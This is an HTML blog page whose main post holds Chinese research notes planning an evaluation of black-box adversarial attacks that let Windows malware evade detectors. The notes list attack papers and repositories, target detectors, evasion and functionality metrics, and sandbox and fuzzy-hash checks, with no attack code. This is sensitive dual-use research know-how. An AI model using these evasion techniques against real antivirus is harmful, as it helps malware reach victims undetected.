<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="不捨晝夜。">
<meta property="og:type" content="website">
<meta property="og:title" content="talk is cheap, show me the code.">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="talk is cheap, show me the code.">
<meta property="og:description" content="不捨晝夜。">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="theLonging">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>talk is cheap, show me the code.</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">talk is cheap, show me the code.</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/07/05/estimation-on-black-box-adversarial-attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.JPG">
      <meta itemprop="name" content="theLonging">
      <meta itemprop="description" content="不捨晝夜。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="talk is cheap, show me the code.">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/07/05/estimation-on-black-box-adversarial-attack/" class="post-title-link" itemprop="url">estimation on black-box adversarial-attack</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-07-05 15:42:27" itemprop="dateCreated datePublished" datetime="2024-07-05T15:42:27+08:00">2024-07-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-09-13 11:10:15" itemprop="dateModified" datetime="2024-09-13T11:10:15+08:00">2024-09-13</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>29k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>26 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Evaluation of Black-box Portable Executable (PE) Adversarial Attack</p>
<h2 id="1-黑盒PE对抗性攻击的评估实验计划"><a href="#1-黑盒PE对抗性攻击的评估实验计划" class="headerlink" title="1. 黑盒PE对抗性攻击的评估实验计划"></a>1. 黑盒PE对抗性攻击的评估实验计划</h2><ol>
<li>论文是怎么选的 paper selection 画个表</li>
<li>复现代码，参数调整是怎么做的，</li>
<li>sok的工作</li>
<li>记录跑代码时的issue，什么方法遇到什么问题</li>
<li>setting</li>
<li>商用软件的选择的理由</li>
<li>把评判基准选出来</li>
</ol>
<p>实验设计，论文框架，每个实验是要说明什么？数据集怎么设置？</p>
<h3 id="1-1-Attacker-的选择问题"><a href="#1-1-Attacker-的选择问题" class="headerlink" title="1.1 Attacker 的选择问题"></a>1.1 Attacker 的选择问题</h3><ul>
<li>首先是要找<strong>开源的</strong>、<strong>攻击黑盒检测器</strong>的Attacker</li>
<li>按照<strong>学习方法</strong>（strategy）分类</li>
<li>按照<strong>突变操作</strong>（Manipulation）分类</li>
</ul>
<table>
<thead>
<tr>
<th align="left">Attacker</th>
<th>Manipulation</th>
<th>strategy</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>Generating Adversarial Malware Examples for Black-Box Attacks Based on GAN</strong>. <em>Weiwei Hu, Ying Tan</em>. Arxiv 2017. <code>Black-box</code> [<a target="_blank" rel="noopener" href="https://arxiv.org/pdf/1702.05983.pdf">pdf</a>] [<a target="_blank" rel="noopener" href="https://github.com/yanminglai/Malware-GAN">code</a>]</td>
<td>Add irrelevant API calls</td>
<td>GAN</td>
</tr>
<tr>
<td align="left">✅<strong>Learning to Evade Static PE Machine Learning Malware Models via Reinforcement Learning</strong>. <em>Hyrum S. Anderson, Anant Kharkar, Bobby Filar, David Evans, Phil Roth</em>. Arxiv 2018. <code>Black-box</code> [<a target="_blank" rel="noopener" href="https://arxiv.org/pdf/1801.08917.pdf">pdf</a>] [<a target="_blank" rel="noopener" href="https://github.com/endgameinc/gym-malware">code</a>]</td>
<td>format-preserving modifications</td>
<td>Reinforcement Learning</td>
</tr>
<tr>
<td align="left">✅<strong>ARMED: How Automatic Malware Modifications Can Evade Static Detection?</strong>. <em>Raphael Labaca Castro, Corinna Schmitt, Gabi Dreo Rodosek</em>. International Conference on Information Management 2019. <code>Black-box</code> [<a target="_blank" rel="noopener" href="https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&arnumber=8714698">pdf</a>] [<a target="_blank" rel="noopener" href="https://github.com/zRapha/AIMED">code</a>]</td>
<td>format-preserving modifications</td>
<td>Randomization</td>
</tr>
<tr>
<td align="left">✅<strong>AIMED: Evolving Malware with Genetic Programming to Evade Detection</strong>. <em>Raphael Labaca Castro, Corinna Schmitt, Gabi Dreo Rodosek</em>. IEEE International Conference On Trust, Security And Privacy In Computing And Communications&#x2F;IEEE International Conference On Big Data Science And Engineering (TrustCom&#x2F;BigDataSE) 2019. <code>Black-box</code> [<a target="_blank" rel="noopener" href="https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&arnumber=8887384">pdf</a>] [<a target="_blank" rel="noopener" href="https://github.com/zRapha/AIMED">code</a>]</td>
<td>format-preserving modifications</td>
<td>Genetic Programming</td>
</tr>
<tr>
<td align="left"><strong>Shallow Security: on the Creation of Adversarial Variants to Evade Machine Learning-Based Malware Detectors</strong>. <em>Fabricio Ceschin, Marcus Botacin, Heitor Murilo Gomes, L. S. Oliveira, A. Grégio</em>. Reversing and Offensive-Oriented Trends Symposium (ROOTS) 2019. <code>Black-box</code> [<a target="_blank" rel="noopener" href="https://github.com/marcusbotacin/Dropper/tree/master/paper">pdf</a>] [<a target="_blank" rel="noopener" href="https://github.com/marcusbotacin/Dropper">code</a>]</td>
<td>Append strings from goodware  &amp; Packing</td>
<td>Randomization</td>
</tr>
<tr>
<td align="left">✅<strong>Malware Makeover: Breaking ML-based Static Analysis by Modifying Executable Bytes</strong>. <em>Keane Lucas, Mahmood Sharif, Lujo Bauer, Michael K. Reiter, Saurabh Shintre</em>. Arxiv 2019. <code>Black-box and White-box</code> [<a target="_blank" rel="noopener" href="https://arxiv.org/pdf/1912.09064.pdf">pdf</a>] [<a target="_blank" rel="noopener" href="https://github.com/pwwl/enhanced-binary-diversification">code</a>]</td>
<td>Binary diversification techniques</td>
<td>Hill-climbing algorithm</td>
</tr>
<tr>
<td align="left"><strong>MAB-Malware: A Reinforcement Learning Framework for Attacking Static Malware Classifiers</strong>. <em>Wei Song, Xuezixiang Li, Sadia Afroz, Deepali Garg, Dmitry Kuznetsov, Heng Yin</em>. Arxiv 2020. <code>Black-box</code> [<a target="_blank" rel="noopener" href="https://arxiv.org/pdf/2003.03100.pdf">pdf</a>] [<a target="_blank" rel="noopener" href="https://github.com/bitsecurerlab/adversarial_malware.git">code</a>]</td>
<td>format-preserving (macro &amp; micro) modifications</td>
<td>Weighted Randomization</td>
</tr>
<tr>
<td align="left">✅<strong>AIMED-RL: Exploring Adversarial Malware Examples with Reinforcement Learning</strong>. <em>Labaca-Castro, Raphael, Sebastian Franz, Gabi Dreo Rodosek</em>. Joint European Conference on Machine Learning and Knowledge Discovery in Databases (ECML-PKDD) 2021.</td>
<td>format-preserving modifications</td>
<td>Reinforcement Learning</td>
</tr>
<tr>
<td align="left">✅<strong>Functionality-preserving Black-box Optimization of Adversarial Windows Malware</strong>. <em>Luca Demetrio, Battista Biggio, Giovanni Lagorio, Fabio Roli, Alessandro Armando1</em>. IEEE Transactions on Information Forensics and Security 2021. <code>Black-box</code> [<a target="_blank" rel="noopener" href="https://ieeexplore.ieee.org/abstract/document/9437194">pdf</a>] [<a target="_blank" rel="noopener" href="https://github.com/zangobot/secml_malware">code</a>]</td>
<td>Inject and pad sections from benign PE files</td>
<td>Genetic Algorithm</td>
</tr>
<tr>
<td align="left">✅<strong>Adversarial EXEmples: A Survey and Experimental Evaluation of Practical Attacks on Machine Learning for Windows Malware Detection</strong>. <em>Luca Demetrio, Scott E. Coull, Battista Biggio, Giovanni Lagorio, Alessandro Armando, Fabio Roli</em>. ACM Transactions on Privacy and Security 2021. <code>Black-box and White-box</code> [<a target="_blank" rel="noopener" href="https://dl.acm.org/doi/10.1145/3473039">pdf</a>] [<a target="_blank" rel="noopener" href="https://github.com/zangobot/secml_malware">code</a>]</td>
<td>DOS Header Extension, Content Shifting</td>
<td>Gradient-based（这里不一定对，因为它是黑盒白盒都有的）</td>
</tr>
<tr>
<td align="left">✅<strong>MalwareTotal: Multi-Faceted and Sequence-Aware Bypass Tactics Against Static Malware Detection.</strong> <em>Shuai He and Cai Fu and Hong Hu and Jiahe Chen and Jianqiang Lv and Shuai Jiang Proceedings of the 46th International Conference on Software Engineering (ICSE 2024)</em></td>
<td>23个方法</td>
<td>近端策略优化（PPO）（这个是直接调用api.learn学习）</td>
</tr>
<tr>
<td align="left">✅<strong>A Wolf in Sheep’s Clothing: Practical Black-box Adversarial Attacks for Evading Learning-based Windows Malware Detection in the Wild.</strong> <em>USENIX Security Symposium 2024.</em></td>
<td>Slack_space &amp; new_section</td>
<td>MCTS</td>
</tr>
</tbody></table>
<h3 id="1-2-Detector-的选择问题"><a href="#1-2-Detector-的选择问题" class="headerlink" title="1.2 Detector 的选择问题"></a>1.2 Detector 的选择问题</h3><p><del>这是个好问题、我也不知道怎么选</del></p>
<p><strong>问题：商用杀毒软件没有提供自动化检测的接口、且商用杀毒软件是要付费的</strong></p>
<ul>
<li>首先一定要能很好自动化检测的Detector（这是由于我们要集成到不同attacker的接口上）</li>
<li>Detector的选择一定要多样化，基于<strong>机器学习</strong>的检测器和基于<strong>其他策略</strong>的检测器</li>
</ul>
<table>
<thead>
<tr>
<th>Detector</th>
<th>Paper</th>
<th>Category</th>
<th>Architectures</th>
<th>Features</th>
</tr>
</thead>
<tbody><tr>
<td>✅EMBER</td>
<td>Anderson, H. S., Roth, P., 2018. EMBER: an open dataset for training static PE mal- ware machine learning models. ArXiv preprint arXiv:1804.04637.</td>
<td>static</td>
<td>LightGBM</td>
<td>Byte Sequence&amp;Readable String&amp;Header Information</td>
</tr>
<tr>
<td>✅MalConv</td>
<td>Raff, E., Barker, J., Sylvester, J., Brandon, R., Catanzaro, B., Nicholas, C., 2017. Malware detection by eating a whole EXE. ArXiv preprint arXiv:1710.09435.</td>
<td>static</td>
<td>CNN</td>
<td>Byte Sequence</td>
</tr>
<tr>
<td>✅MalGraph</td>
<td>Ling, X., Wu, L., Deng, W., Qu, Z., Zhang, J., Zhang, S., Ma, T., Wang, B., Wu, C., Ji, S., 2022. MalGraph: Hierarchical graph neural networks for robust Windows mal- ware detection. In: IEEE Conference on Computer Communications. IEEE, Virtual Event, pp. 1998–2007.</td>
<td>Static &amp; dynamic</td>
<td></td>
<td>Control Flow Graph&amp;Function Call Graph</td>
</tr>
<tr>
<td>✅ClamAV（开源的反病毒软件）</td>
<td>\</td>
<td>ClamAV 依赖签名来区分干净文件和恶意&#x2F;不需要的文件。</td>
<td>\</td>
<td>signature based</td>
</tr>
<tr>
<td>✅AvastNet</td>
<td>Krcˇál, M., Švec, O., Bálek, M., Jašek, O., 2018. Deep convolutional malware classifiers can learn from raw executables and labels only. In: International Conference on Learning Representations – Workshop Track. OpenReview.net, Vancouver, BC, Canada, pp. 1–4.</td>
<td>\</td>
<td>DNN</td>
<td>\</td>
</tr>
<tr>
<td>Magic</td>
<td>Jiaqi Yan, Guanhua Yan, and Dong Jin. Classifying malware represented as control flow graphs using deep graph convolutional neural network. In <em>DSN</em>, 2019.</td>
<td>\</td>
<td>CNN</td>
<td>control flow graphs</td>
</tr>
</tbody></table>
<h4 id="Mal-Graph"><a href="#Mal-Graph" class="headerlink" title="Mal Graph:"></a>Mal Graph:</h4><p><strong>当前检测器存在的问题</strong></p>
<ul>
<li>它们忽略了可执行文件中的丰富语义信息，因此无法捕捉恶意软件的内在属性，例如不同函数如何在可执行文件中交互、不同函数的语义是什么等；</li>
<li>它们无法提供稳健的恶意软件检测，因为它们依赖的表示方式很容易被修改，而不会影响可执行文件的功能。</li>
</ul>
<p><strong>本文提出</strong></p>
<ul>
<li>函数调用图（FCG）用于学习不同函数之间的交互语义（在函数间级别）</li>
<li>控制流图（CFG）则用于学习每个函数的结构语义（在函数内部级别）</li>
</ul>
<p><strong>本文的主要贡献包括：</strong></p>
<ul>
<li>据我们所知，这是首次通过层次化图表示可执行程序，其中大部分结构信息得到了保留和学习。</li>
<li>我们提出了MalGraph，这是一种基于层次化图的新型层次化图神经网络，能够有效且稳健地检测Windows恶意软件。</li>
<li>大量评估表明，MalGraph在检测效果和鲁棒性方面均优于三种最先进的基线检测方法。</li>
</ul>
<h3 id="1-3-Dataset的选择问题"><a href="#1-3-Dataset的选择问题" class="headerlink" title="1.3 Dataset的选择问题"></a>1.3 Dataset的选择问题</h3><ul>
<li>首先是要多样化，要包含足够丰富的病毒家族</li>
<li>不支持使用病毒的特征向量，因为从特征向量到二进制程序的过程是不可微的</li>
</ul>
<p>但是选择多大的Dataset合适？</p>
<h3 id="1-4-评价的指标问题"><a href="#1-4-评价的指标问题" class="headerlink" title="1.4 评价的指标问题"></a>1.4 评价的指标问题</h3><p>我们评价一个黑盒对抗性攻击器好坏的指标是什么？</p>
<ol>
<li><p><strong>逃逸效率</strong>：能逃逸的检测器越多越好，能逃逸的比例越高越好</p>
<ul>
<li><p><strong>Learning to Evade Static PE Machine Learning Malware Models via Reinforcement Learning</strong></p>
<p>对逃逸率的定义：对同一个恶意软件尝试生成100个对抗性样本，其中如果有80个对抗性样本成功逃逸，逃逸率为80%</p>
</li>
<li><p>其他的论文：100个恶意软件有80个成功生成对抗性样本，则逃逸率为80%</p>
</li>
</ul>
</li>
<li><p>是否<strong>保持PE格式</strong>、<strong>可执行</strong>、<strong>恶意功能</strong>：生成的可以保持恶意功能的对抗性样本的比率越高越好</p>
<ul>
<li><code>ARMED、AIMED、AIMED-RL</code>的<code>functionality</code>的检测方法不具备说服力<ul>
<li>函数<code>malware_analysis</code>：样本在沙盒中运行时间超过<code>15s</code>且报告中没有<code>err</code>，则为<code>functionality</code></li>
<li>函数<code>malware_analysis_HA</code>：样本报告中含有<code>domains</code>或<code>compromised_hosts</code>，则为<code>functionality</code></li>
</ul>
</li>
<li>&#96;MAB-malware:<ul>
<li>cuckoo沙盒返回的签名：<code>检测到加密行为 || 原始签名列表中未找到相同签名的数量少于或等于1 ||相似率大于等于 80%</code></li>
</ul>
</li>
<li><code>A Wolf in Sheep’s Clothing</code> <strong>通过在 Cuckoo 沙盒中运行 z 和 zadv 时收集和比较两者调用的 API 序列 (即 APIz 和 APIzadv) 来判断其语义保留率</strong></li>
<li><code>MalwareTotal:</code> 比较cuckoo返回的签名，如果相同则证明保持了功能性</li>
</ul>
</li>
<li><p>生成<strong>对抗性样本的时间效率</strong>：时间越快越好</p>
</li>
<li><p><strong>生成对抗性样本的大小</strong>和<strong>原始病毒样本的大小</strong>比较</p>
</li>
<li><p>在<strong>哈希狩猎</strong>的表现下如何？</p>
</li>
</ol>
<h3 id="1-5-实验设计"><a href="#1-5-实验设计" class="headerlink" title="1.5 实验设计"></a>1.5 实验设计</h3><p>针对评价指标设计实验</p>
<ol>
<li><strong>逃逸效率</strong>：<ul>
<li>针对基于机器学习的检测器的逃逸效率</li>
<li>针对商用检测器的逃逸效率（<strong>既然是黑盒攻击，尝试直接将商用软件集成到攻击模型中</strong>）</li>
<li>最后是不是将生成的对抗性样本上传到VirusTotal上获取结果？</li>
</ul>
</li>
<li>是否<strong>保持PE格式</strong>、<strong>可执行</strong>、<strong>恶意功能</strong>：<ul>
<li>检测PE格式：使用python脚本检测PE格式</li>
<li>检测可执行性：使用沙盒检测生成样本的可执行性（计划使用开源的Cuckoo Sandbox）</li>
<li>检测恶意功能：使用沙盒检测生成样本的恶意功能（计划使用开源的Cuckoo Sandbox、方法采用<em>A Wolf in Sheep’s Clothing</em>中提到的方法：<strong>通过在 Cuckoo 沙盒中运行 z 和 zadv 时收集和比较两者调用的 API 序列 (即 APIz 和 APIzadv) 来判断其语义保留率。</strong>）</li>
</ul>
</li>
<li>生成对抗性样本的<strong>时间效率</strong>：<ul>
<li>这个没啥好说的，直接统计时间就可以了</li>
<li>值得注意的是、可以比较一下什么是更高效的搜索算法</li>
</ul>
</li>
<li><strong>样本大小</strong>的比较<ul>
<li>这个直接比较大小就好</li>
</ul>
</li>
<li><strong>哈希狩猎</strong>下的表现<ul>
<li>使用TLSH、SSDEEP比较相似性得分</li>
</ul>
</li>
</ol>
<h3 id="1-6-一些我认为是以前的文章没有做过的工作"><a href="#1-6-一些我认为是以前的文章没有做过的工作" class="headerlink" title="1.6 一些我认为是以前的文章没有做过的工作"></a>1.6 一些我认为是以前的文章没有做过的工作</h3><ol>
<li>既然对抗性样本和原始病毒样本具有相同的语义、那么在基于<strong>哈希值的病毒狩猎</strong>中、对抗性样本的表现如何？<ul>
<li>例如 TLSH、ImpHash、SSDeep等</li>
</ul>
</li>
<li>对恶意软件样本进行<strong>分类</strong>、查看不同类别的表现如何、是否有特定的操作对于特定的类别的病毒样本效果很好？</li>
<li><del>据我所知，这是第一个对黑盒对抗攻击的评估，最终目标是可以做成一个benchmark platform</del></li>
</ol>
<h3 id="1-7-实验平台搭建："><a href="#1-7-实验平台搭建：" class="headerlink" title="1.7 实验平台搭建："></a>1.7 实验平台搭建：</h3><h4 id="1-7-1-保持PE格式、可执行、恶意功能的检测模块"><a href="#1-7-1-保持PE格式、可执行、恶意功能的检测模块" class="headerlink" title="1.7.1 保持PE格式、可执行、恶意功能的检测模块"></a>1.7.1 <strong>保持PE格式</strong>、<strong>可执行</strong>、<strong>恶意功能</strong>的检测模块</h4><ul>
<li><p>编写python脚本检查PE文件是否保持PE格式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：PE二进制文件</span><br><span class="line">输出：是否符合PE文件格式</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用Cuckoo 沙盒检查对抗性样本是否可执行？</p>
</li>
<li><p>使用Cuckoo 沙盒检查对抗性样本是否维持恶意功能</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过在 Cuckoo 沙盒中运行 z 和 zadv 时收集和比较两者调用的 API 序列 (即 APIz 和 APIzadv) 来判断其语义保留率。</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="1-7-2-数据集模块"><a href="#1-7-2-数据集模块" class="headerlink" title="1.7.2 数据集模块"></a>1.7.2 数据集模块</h4><p>编写python脚本，使用AVCLASS2对数据集进行分类。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：PE二进制文件</span><br><span class="line">输出：分类</span><br></pre></td></tr></table></figure>

<h4 id="1-7-3-哈希狩猎检测模块"><a href="#1-7-3-哈希狩猎检测模块" class="headerlink" title="1.7.3 哈希狩猎检测模块"></a>1.7.3 哈希狩猎检测模块</h4><p>编写python脚本，计算对抗性样本和原始病毒样本的相似性得分</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：对抗性样本，原始病毒样本</span><br><span class="line">输出：得分</span><br></pre></td></tr></table></figure>

<p>需要注意的是，<strong>判断两个文件相似的阈值</strong>应该设置为多少？</p>
<h4 id="1-7-4-文件大小比较模块"><a href="#1-7-4-文件大小比较模块" class="headerlink" title="1.7.4 文件大小比较模块"></a>1.7.4 文件大小比较模块</h4><p>编写python脚本，计算对抗性样本和原始病毒样本的大小差异</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：对抗性样本，原始病毒样本</span><br><span class="line">输出：两个文件的大小差异</span><br></pre></td></tr></table></figure>

<h4 id="1-7-5-攻击器的生成效率"><a href="#1-7-5-攻击器的生成效率" class="headerlink" title="1.7.5 攻击器的生成效率"></a>1.7.5 攻击器的生成效率</h4><p>这个直接计算生成样本消耗的时间就可以了</p>
<p>控制变量法：相同的数据集，攻击相同的检测器，迭代次数是不是要相同？最终生成的对抗性样本数量肯定是不同的，这个问题该如何解决？</p>
<h4 id="1-7-6-黑盒检测器接口模块"><a href="#1-7-6-黑盒检测器接口模块" class="headerlink" title="1.7.6 黑盒检测器接口模块"></a>1.7.6 黑盒检测器接口模块</h4><p>修改不同攻击器攻击的黑盒检测器模块，使其成为一个接口，能向攻击器返回不同检测器反馈的结果。（这一部分应该是最难的点）</p>
<h2 id="2-现有survey的优缺点"><a href="#2-现有survey的优缺点" class="headerlink" title="2. 现有survey的优缺点"></a>2. 现有survey的优缺点</h2><h3 id="2-1-Adversarial-Attacks-against-Windows-PE-Malware-Detection-A-Survey-of-the-State-of-the-Art-Computer-amp-Security-2023"><a href="#2-1-Adversarial-Attacks-against-Windows-PE-Malware-Detection-A-Survey-of-the-State-of-the-Art-Computer-amp-Security-2023" class="headerlink" title="2.1 Adversarial Attacks against Windows PE Malware Detection: A Survey of the State-of-the-Art; Computer &amp; Security 2023"></a>2.1 Adversarial Attacks against Windows PE Malware Detection: A Survey of the State-of-the-Art; <code>Computer &amp; Security 2023</code></h3><p><strong>论文贡献</strong></p>
<ol>
<li>强调了<strong>保持PE格式</strong>、<strong>保持可执行性</strong>、<strong>保持恶意性</strong></li>
<li>提出了一个<strong>完整的分类法</strong></li>
<li>总结了现有针对<strong>PE恶意软件检测的对抗性攻击</strong>和<strong>防御措施</strong></li>
</ol>
<h4 id="2-1-1-Pros"><a href="#2-1-1-Pros" class="headerlink" title="2.1.1 Pros:"></a>2.1.1 Pros:</h4><p>分别对attacker和detector进行了分类和总结：</p>
<ul>
<li><p>对检测器的分类（基于特征工程）：</p>
<ul>
<li>静态特征：<ul>
<li>字节序列</li>
<li>可读字符串</li>
<li>头信息</li>
<li>灰度图像</li>
</ul>
</li>
<li>动态特征：<ul>
<li>系统资源状态</li>
<li>文件状态</li>
<li>注册表状态</li>
<li>网络状态</li>
</ul>
</li>
<li>混合特征：<ul>
<li>操作码</li>
<li>系统&#x2F;API调用</li>
<li>控制流程图（CFG）</li>
<li>函数调用图</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>对抗性攻击的分类</strong>：</p>
<p><img src="/../images/estimation-on-black-box-adversarial-attack/%E6%88%AA%E5%B1%8F2024-07-05%2016.01.05.png" alt="截屏2024-07-05 16.01.05"></p>
</li>
</ul>
<p>提出了未来的研究方向：</p>
<ol>
<li>Strong Demands for Robust PE Malware Detection</li>
<li>Practical and Efficient Adversarial Attacks against Commercial Anti-viruses in the Wild</li>
<li>Lack of Benchmark Platforms for Research</li>
</ol>
<h4 id="2-1-2-Cons"><a href="#2-1-2-Cons" class="headerlink" title="2.1.2 Cons:"></a>2.1.2 Cons:</h4><ul>
<li>贡献中提到的<strong>保持PE格式</strong>、<strong>保持可执行性</strong>、<strong>保持恶意性</strong>并没有通过<strong>实验数据的佐证</strong></li>
<li>survey没有衡量attacker得各项指标</li>
</ul>
<h4 id="2-1-3-Argue"><a href="#2-1-3-Argue" class="headerlink" title="2.1.3 Argue:"></a>2.1.3 Argue:</h4><ul>
<li>Benchmark Platform for Research 是一个很好的工作（<strong>但这个工作可能比较遥远</strong>）</li>
<li>除了Attack Strategy的总结、是否要对attack manipulation进行总结、对attack manipulation的细化到什么程度</li>
</ul>
<h3 id="2-2-A-comparison-of-adversarial-malware-generators-Journal-of-Computer-Virology-and-Hacking-Techniques-2024"><a href="#2-2-A-comparison-of-adversarial-malware-generators-Journal-of-Computer-Virology-and-Hacking-Techniques-2024" class="headerlink" title="2.2 A comparison of adversarial malware generators;Journal of Computer Virology and Hacking Techniques 2024"></a>2.2 A comparison of adversarial malware generators;<code>Journal of Computer Virology and Hacking Techniques 2024</code></h3><p><strong>论文贡献</strong></p>
<ol>
<li>我们将一些现有的对抗性学习方法应用于选定的恶意软件检测系统。</li>
<li>我们结合这些方法创建了更复杂的对抗性生成器，能够绕过顶级的杀毒产品。</li>
<li>我们从准确性和实际可用性方面评估了单一和组合生成器。</li>
</ol>
<p><strong>攻击的选择</strong></p>
<ol>
<li>基于梯度的技术：部分DOS；完全DOS</li>
<li>基于进化的算法：GAMMA填充；GAMMA注入</li>
<li>基于强化学习的技术：Gym-malware</li>
</ol>
<p><strong>实验设计</strong></p>
<p><strong>数据集：</strong></p>
<p>3625个来自windows11的无害PE文件</p>
<p>3625个从VirusShare库中获得的文件</p>
<p><strong>攻击设计：</strong></p>
<ul>
<li>部分DOS；完全DOS — 最大迭代次数：50 —&gt; Malconv <em>白盒</em></li>
<li>GAMMA填充；GAMMA注入 — 最大迭代次数：500；正则化参数：10^-5 —&gt; Malconv <em>黑盒</em></li>
<li>Gym-malware ——&gt; GDBT <em>黑盒</em></li>
</ul>
<h4 id="2-2-1-Pros"><a href="#2-2-1-Pros" class="headerlink" title="2.2.1 Pros"></a>2.2.1 Pros</h4><ul>
<li><p>第一篇评估当前对抗性攻击生成器的文章</p>
</li>
<li><p>评估的指标选用了<strong>样本大小变化</strong>（这项是我们的评估方法中可以采取的）：</p>
<blockquote>
<p>通常，攻击者的目标是将生成的对抗性文件大小的增加最小化，使其更难与原始恶意软件样本分开</p>
</blockquote>
</li>
</ul>
